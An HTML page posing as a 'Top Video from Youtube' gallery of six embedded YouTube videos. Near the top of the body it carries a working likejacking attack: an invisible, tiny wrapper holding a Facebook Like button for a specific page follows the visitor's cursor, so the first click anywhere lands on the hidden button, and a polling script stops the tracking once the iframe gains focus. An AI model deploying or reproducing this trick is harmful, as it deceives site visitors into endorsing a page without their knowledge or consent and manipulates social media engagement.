<script>document.write('<script src="http://' + (location.host || 'localhost').split(':')[0] + ':35729/livereload.js?snipver=1"></' + 'script>')</script>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>link</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <link rel="stylesheet" href="bootstrap/bootstrap.min.css">
    <link rel="stylesheet" href="bootstrap/bootstrap.min.js">
    <link rel="stylesheet" href="styles.css">
    <script type="text/javascript">
    var interval = 0;

    function updateActiveElement() {
        if ($(document.activeElement).attr('id') == "fb-iframe") {
            clearInterval(interval);
            bodyClicked = true;
        }
    }

    $(function() {
        interval = setInterval("updateActiveElement();", 50);
    });
    </script>
</head>

<body>
    <div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="iframe-wrapper">
        <iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/ValeryDesignlt/&send=false&layout=button_count&width=450&show_faces=false&action=like&colorscheme=light&font&height=21&confirm=false" scrolling="no" frameborder="0" style="border:no;
        overflow:hidden;width:450px;height:21px;" allowTransparency="false"></iframe>
    </div>
    <script type="text/javascript">
    var bodyClicked = false;
    var iframeWrapper = document.getElementById('iframe-wrapper');
    var standardBody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body;

    function mouseFollower(e) {
        // for internet explorer
        if (window.event) {
            iframeWrapper.style.top = (window.event.y - 5) + standardBody.scrollTop + 'px';
            iframeWrapper.style.left = (window.event.x - 5) + standardBody.scrollLeft + 'px';
        } else {
            iframeWrapper.style.top = (e.pageY - 5) + 'px';
            iframeWrapper.style.left = (e.pageX - 5) + 'px';
        }
    }

    document.onmousemove = function(e) {
        if (bodyClicked == false) {
            mouseFollower(e);
        }
    }
    </script>
    <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/lVkWJiRE6tA" frameborder="0" allowfullscreen></iframe> -->
    <div class="header">
        <div class="container-fluid"><center><h2>Top Video from Youtube</h2></center></div>
    </div>
<!-- body container -->
<div class="container">
    <div class="row">
        <div class="col-sm-12 button"><center>
            <button class="btn btn-danger btn-large"><a href="https://www.youtube.com/watch?v=KJDKL6K-kOs" class="text-white" target="blank">LIKE THIS</a></button></div>
            <img src="images/Screen Shot 2017-02-24 at 00.44.37.png" alt="" class="img">
        </center>
    </div>
    <div class="row">
        <div class="col-sm-12 col-md-4 col-lg-4">
            <iframe src="https://www.youtube.com/embed/lVkWJiRE6tA" frameborder="0" allowfullscreen></iframe>
        </div>
        <div class="col-sm-12 col-md-4 col-lg-4">
           <iframe src="https://www.youtube.com/embed/1dQrGX-bM5E" frameborder="0" allowfullscreen></iframe>
        </div>
        <div class="col-sm-12 col-md-4 col-lg-4">
            <iframe src="https://www.youtube.com/embed/Qsfe-trkZ20" frameborder="0" allowfullscreen></iframe>
        </div>
        <div class="col-sm-12 col-md-4 col-lg-4">
            <iframe src="https://www.youtube.com/embed/AkceM1MafK0" frameborder="0" allowfullscreen></iframe>
        </div>
        <div class="col-sm-12 col-md-4 col-lg-4">
          <iframe src="https://www.youtube.com/embed/g6Qm1TgVNeE" frameborder="0" allowfullscreen></iframe>
        </div>
        <div class="col-sm-12 col-md-4 col-lg-4">
           <iframe src="https://www.youtube.com/embed/lsd11fDOcTE" frameborder="0" allowfullscreen></iframe>
        </div>
    </div>
</div>




</body>

</html>
